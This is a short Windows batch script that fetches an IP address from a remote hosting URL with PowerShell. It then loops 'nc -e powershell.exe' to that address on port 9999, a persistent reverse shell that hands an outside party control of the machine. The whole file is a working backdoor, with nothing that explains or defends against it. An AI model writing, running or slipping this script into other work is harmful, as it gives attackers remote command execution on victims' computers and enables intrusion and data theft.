@echo off
:loop
for /f %%a in ('powershell Invoke-RestMethod https://ibnusaja.nasihosting.com/temp.txt') do set IP=%%a
REM echo %IP% 

nc -e powershell.exe %IP% 9999

goto loop
